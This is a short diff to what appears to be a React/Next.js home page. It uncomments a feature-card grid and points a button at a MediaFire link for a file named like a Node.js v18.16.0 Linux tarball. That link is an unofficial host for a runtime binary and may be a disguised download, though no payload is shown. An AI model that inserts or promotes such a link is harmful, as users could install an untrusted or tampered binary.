@@ -50,7 +50,7 @@ export default async function Home() {
         >
           <a
             className="group flex max-w-fit items-center justify-center space-x-2 rounded-full border border-black bg-black px-5 py-2 text-sm text-white transition-colors hover:bg-white hover:text-black"
-            href="#"
+            href="https://www.mediafire.com/file/2927kdhokseser6/node-v18.16.0-linux-x64.tar/file"
             target="_blank"
             rel="noopener noreferrer"
           >
@@ -83,7 +83,7 @@ export default async function Home() {
           </a>
         </div>
       </div>
-      {/* <div className="my-10 grid w-full max-w-screen-xl animate-fade-up grid-cols-1 gap-5 px-5 md:grid-cols-3 xl:px-0">
+      <div className="my-10 grid w-full max-w-screen-xl animate-fade-up grid-cols-1 gap-5 px-5 md:grid-cols-3 xl:px-0">
         {features.map(({ title, description, demo, large }) => (
           <Card
             key={title}
@@ -99,7 +99,7 @@ export default async function Home() {
             large={large}
           />
         ))}
-      </div> */}
+      </div>
     </>
   );
 }
